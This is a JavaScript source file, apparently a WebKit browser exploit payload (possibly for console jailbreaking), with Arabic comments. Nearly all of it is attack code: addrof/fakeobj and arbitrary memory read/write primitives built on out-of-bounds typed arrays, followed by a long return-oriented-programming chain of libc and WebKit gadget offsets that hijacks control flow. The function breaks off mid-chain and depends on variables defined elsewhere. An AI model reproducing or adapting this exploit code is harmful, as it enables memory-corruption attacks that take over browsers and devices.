function jb(val) {
    // 1. إعداد دوال قراءة وكتابة الذاكرة (Memory Helpers)
    function addrof(x) { 
        leaker_obj.a = x; 
        return i48_get(leaker_arr); 
    }
    
    function fakeobj(x) { 
        i48_put(x, leaker_arr); 
        return leaker_obj.a; 
    }
    
    function read_mem_setup(p, sz) { 
        i48_put(p, oob_master); 
        oob_master[6] = sz; 
    }
    
    function read_mem(p, sz) {
        read_mem_setup(p, sz);
        var arr = [];
        for (var i = 0; i < sz; i++) arr.push(oob_slave[i]);
        return arr;
    }
    
    function read_mem_s(p, sz) { 
        read_mem_setup(p, sz); 
        return "" + oob_slave; 
    }
    
    function read_mem_b(p, sz) {
        read_mem_setup(p, sz);
        var b = new Uint8Array(sz);
        b.set(oob_slave);
        return b;
    }
    
    function read_mem_as_string(p, sz) {
        var x = read_mem_b(p, sz);
        var ans = '';
        for (var i = 0; i < x.length; i++) ans += String.fromCharCode(x[i]);
        return ans;
    }
    
    function write_mem(p, data) {
        i48_put(p, oob_master);
        oob_master[6] = data.length;
        for (var i = 0; i < data.length; i++) oob_slave[i] = data[i];
    }
    
    function read_ptr_at(p) {
        var ans = 0;
        var d = read_mem(p, 8);
        for (var i = 7; i >= 0; i--) ans = 256 * ans + d[i];
        return ans;
    }
    
    function write_ptr_at(p, d) {
        var arr = [];
        for (var i = 0; i < 8; i++) { arr.push(d & 0xff); d /= 256; }
        write_mem(p, arr);
    }

    // 2. إعداد مصفوفة الأدوات الـ ROP chain
    var ropchain_array = new Uint32Array(150448);
    var ropchain = read_ptr_at(addrof(ropchain_array) + 0x10);
    var ropchain_offset = 2;

    function set_gadget(val) {
        ropchain_array[ropchain_offset++] = val | 0;
        ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
    }

    function set_gadgets(l) {
        for (var i = 0; i < l.length; i++) set_gadget(l[i]);
    }

    function db(data) {
        for (var i = 0; i < data.length; i++) ropchain_array[ropchain_offset++] = data[i];
    }

    // 3. تخصيص مساحات العناوين المؤقتة
    var main_ret = malloc(8);
    var printf_buf = malloc(65536);
    var __swbuf_addr = 0;

    // 4. بناء الـ Payload والـ Gadgets المصححة (تمت إزالة الفواصل الزائدة العشوائية)
    set_gadgets([libc_base + 788575, ropchain + 65720, webkit_base + 14461559, libc_base + 206806, ropchain + 65680, libc_base + 793877]);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 788575, ropchain + 112, libc_base + 471355, libc_base + 811575, ropchain + 419752, libc_base + 811575, ropchain + 65680]);
    
    var printf_buf_offset = 128;
    set_gadget(printf_buf);
    db([4294967295, 4294967295]);
    ropchain_offset += 16384;

    set_gadgets([libc_base + 882884, libc_base + 793877, main_ret, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    set_gadgets([pivot_addr, libc_base + 793877]);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 65800, webkit_base + 7438103, libc_base + 759626, webkit_base + 432898]);
    db([0, 0]);
    set_gadgets([libc_base + 471355, libc_base + 759626, libc_base + 793877, ropchain + 65888, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 65904, webkit_base + 7438103, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(webkit_base + 432898); // تم إصلاح الفاصلة الزائدة هنا
    db([0, 0]);
    set_gadget(libc_base + 793877);   // تم إصلاح الفاصلة الزائدة هنا
    db([16, 0]);
    set_gadgets([libc_base + 547636, libc_base + 793877, ropchain + 66008, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 66024, webkit_base + 7438103, libc_base + 882884, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadgets([libc_base + 270800, libc_base + 793877, ropchain + 66184, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 66152, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 66136, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([16, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 793877, ropchain + 66240, webkit_base + 7438103, libc_base + 50775, libc_base + 206806]);
    db([0, 0]);
    set_gadgets([libc_base + 523896, libc_base + 793877, ropchain + 66344, webkit_base + 7438103, libc_base + 793877, ropchain + 66376, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 66360, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 66536, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 66504, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 66488, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([48, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 877568, libc_base + 793877, ropchain + 66640, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 66624, webkit_base + 7438103, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 792472]);
    db([8, 0]);
    set_gadget(libc_base + 788575);
    db([8, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 877546, libc_base + 793877, ropchain + 66848, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 66816, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([48, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 877568, libc_base + 793877, ropchain + 66952, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 66936, webkit_base + 7438103, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 793877, ropchain + 67032, webkit_base + 7438103, libc_base + 759626, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([16, 0]);
    set_gadgets([libc_base + 547636, libc_base + 793877, ropchain + 67136, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 67152, webkit_base + 7438103, libc_base + 882884, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadgets([libc_base + 270800, libc_base + 793877, ropchain + 67312, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 67280, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 67264, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([16, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 793877, ropchain + 67368, webkit_base + 7438103, libc_base + 50775, libc_base + 206806]);
    db([0, 0]);
    set_gadgets([libc_base + 523896, libc_base + 793877, ropchain + 67472, webkit_base + 7438103, libc_base + 793877, ropchain + 67504, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 67488, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 67664, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 67632, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 67616, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([48, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 877568, libc_base + 793877, ropchain + 67768, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 67752, webkit_base + 7438103, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 792472]);
    db([8, 0]);
    set_gadget(libc_base + 788575);
    db([8, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 67968, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 67936, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([32, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 877568, libc_base + 793877, ropchain + 68072, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 68056, webkit_base + 7438103, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877568, libc_base + 793877, ropchain + 68184, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 68152, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([48, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 877568, libc_base + 793877, ropchain + 68248, webkit_base + 7438103, webkit_base + 1786005, libc_base + 792472]);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877, ropchain + 68304, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, webkit_base + 75236, libc_base + 793877, ropchain + 68448, webkit_base + 7438103, libc_base + 793877, ropchain + 68464, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 68432, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 68584, webkit_base + 7438103, libc_base + 793877, ropchain + 68600, webkit_base + 7438103, libc_base + 759626, libc_base + 793877, ropchain + 68568, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 68696, webkit_base + 7438103, libc_base + 793877, ropchain + 68712, webkit_base + 7438103, webkit_base + 432898]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 68824, webkit_base + 7438103, libc_base + 793877, ropchain + 68808, webkit_base + 7438103, libc_base + 788575]);
    db([0, 0]);
    
    set_gadget(libc_base + 811575);
    db([0, 0]);
    set_gadgets([libc_base + 793877, ropchain + 68912, webkit_base + 7438103, libc_base + 759626, libc_base + 793877, ropchain + 68896, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 69008, webkit_base + 7438103, libc_base + 793877, ropchain + 69024, webkit_base + 7438103, webkit_base + 432898]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 69136, webkit_base + 7438103, libc_base + 793877, ropchain + 69120, webkit_base + 7438103, libc_base + 788575]);
    db([0, 0]);
    
    set_gadget(libc_base + 811575);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 69208, webkit_base + 7438103, libc_base + 759626, webkit_base + 432898]);
    db([0, 0]);
    set_gadgets([libc_base + 471355, libc_base + 759626, libc_base + 793877, ropchain + 69296, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 69312, webkit_base + 7438103, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(webkit_base + 432898);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([16, 0]);
    set_gadgets([libc_base + 547636, libc_base + 793877, ropchain + 69416, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 69432, webkit_base + 7438103, libc_base + 882884, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadgets([libc_base + 191169, libc_base + 793877, ropchain + 69584, webkit_base + 7438103, libc_base + 793877, ropchain + 69616, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 69600, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 69568, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 69712, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 69696, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 792472]);
    db([24, 0]);
    set_gadget(libc_base + 788575);
    db([24, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 69912, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 69880, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([32, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 877568, libc_base + 793877, ropchain + 70016, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 70000, webkit_base + 7438103, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877568, libc_base + 793877]);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 793877, ropchain + 70104, webkit_base + 7438103, libc_base + 759626, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([16, 0]);
    set_gadgets([libc_base + 547636, libc_base + 793877, ropchain + 70208, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 70224, webkit_base + 7438103, libc_base + 882884, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadgets([libc_base + 191169, libc_base + 793877, ropchain + 70376, webkit_base + 7438103, libc_base + 793877, ropchain + 70408, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 70392, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 70360, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 70504, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 70488, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 882884, libc_base + 792472]);
    db([16711680, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877, ropchain + 70616, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, webkit_base + 5202439, libc_base + 793877]);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 792472]);
    db([8, 0]);
    set_gadget(libc_base + 788575);
    db([8, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 70848, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 70816, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([32, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 877568, libc_base + 793877, ropchain + 70952, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 70936, webkit_base + 7438103, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877568, libc_base + 793877, ropchain + 71008, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877, ropchain + 71064, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, webkit_base + 75236, libc_base + 793877]);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 793877, ropchain + 71176, webkit_base + 7438103, libc_base + 759626, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([16, 0]);
    set_gadgets([libc_base + 547636, libc_base + 793877, ropchain + 71280, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 71296, webkit_base + 7438103, libc_base + 882884, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadgets([libc_base + 191169, libc_base + 793877, ropchain + 71448, webkit_base + 7438103, libc_base + 793877, ropchain + 71480, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 71464, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 71432, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 71576, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 71560, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 882884, libc_base + 792472]);
    db([65280, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877, ropchain + 71688, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, webkit_base + 5202439, libc_base + 793877]);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 792472]);
    db([8, 0]);
    set_gadget(libc_base + 788575);
    db([8, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 877546, libc_base + 793877, ropchain + 71872, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877, ropchain + 71928, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, webkit_base + 75236, libc_base + 793877]);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 793877, ropchain + 72040, webkit_base + 7438103, libc_base + 759626, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([16, 0]);
    set_gadgets([libc_base + 547636, libc_base + 793877, ropchain + 72144, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 72160, webkit_base + 7438103, libc_base + 882884, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadgets([libc_base + 191169, libc_base + 793877, ropchain + 72312, webkit_base + 7438103, libc_base + 793877, ropchain + 72344, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 72328, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 72296, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 72440, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 72424, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 792472]);
    db([24, 0]);
    set_gadget(libc_base + 788575);
    db([24, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 877546, libc_base + 793877, ropchain + 72592, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877, ropchain + 72648, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, webkit_base + 75236, libc_base + 793877, ropchain + 72784, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 72752, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([32, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 877568, libc_base + 793877, ropchain + 72912, webkit_base + 7438103, libc_base + 793877, ropchain + 72928, webkit_base + 7438103, libc_base + 759626, libc_base + 793877, ropchain + 72896, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 73024, webkit_base + 7438103, libc_base + 793877, ropchain + 73040, webkit_base + 7438103, webkit_base + 432898]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 73152, webkit_base + 7438103, libc_base + 793877, ropchain + 73136, webkit_base + 7438103, libc_base + 788575]);
    db([0, 0]);
    
    set_gadget(libc_base + 811575);
    db([0, 0]);
    set_gadgets([libc_base + 793877, ropchain + 73240, webkit_base + 7438103, libc_base + 759626, libc_base + 793877, ropchain + 73224, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 73336, webkit_base + 7438103, libc_base + 793877, ropchain + 73352, webkit_base + 7438103, webkit_base + 432898]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 73464, webkit_base + 7438103, libc_base + 793877, ropchain + 73448, webkit_base + 7438103, libc_base + 788575]);
    db([0, 0]);
    
    set_gadget(libc_base + 811575);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 73536, webkit_base + 7438103, libc_base + 759626, webkit_base + 432898]);
    db([0, 0]);
    set_gadgets([libc_base + 471355, libc_base + 50775, libc_base + 793877, ropchain + 73600, webkit_base + 7438103, libc_base + 759626, webkit_base + 432898]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([16, 0]);
    set_gadgets([libc_base + 248252, libc_base + 50775, libc_base + 793877, ropchain + 73680, webkit_base + 7438103, libc_base + 759626, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([16, 0]);
    set_gadgets([libc_base + 547636, libc_base + 793877, ropchain + 73752, webkit_base + 7438103, libc_base + 759626, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 547636, webkit_base + 2997875, libc_base + 759626, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([4294967284, 4294967295]);
    set_gadgets([libc_base + 547636, libc_base + 793877, ropchain + 73888, webkit_base + 7438103, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 954100, libc_base + 793877, ropchain + 73944, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    set_gadgets([libc_base + 793877, ropchain + 73992, webkit_base + 7438103, libc_base + 759626, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([4294967284, 4294967295]);
    set_gadgets([libc_base + 547636, libc_base + 793877, ropchain + 74096, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 74112, webkit_base + 7438103, libc_base + 882884, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadgets([libc_base + 191169, libc_base + 793877, ropchain + 74264, webkit_base + 7438103, libc_base + 793877, ropchain + 74296, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 74280, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 74248, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 74368, webkit_base + 7438103, libc_base + 793877, ropchain + 74384, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 74480, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 74464, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 50775, libc_base + 793877, ropchain + 74560, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([4, 0]);
    set_gadget(libc_base + 788575);
    db([4, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 74712, webkit_base + 7438103, libc_base + 793877, ropchain + 74728, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 74696, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, webkit_base + 14959219, webkit_base + 48555, libc_base + 269973, libc_base + 793877, ropchain + 74896, webkit_base + 7438103, libc_base + 793877, ropchain + 74912, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 74880, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 75016, webkit_base + 7438103, libc_base + 793877, ropchain + 75064, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 75032, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
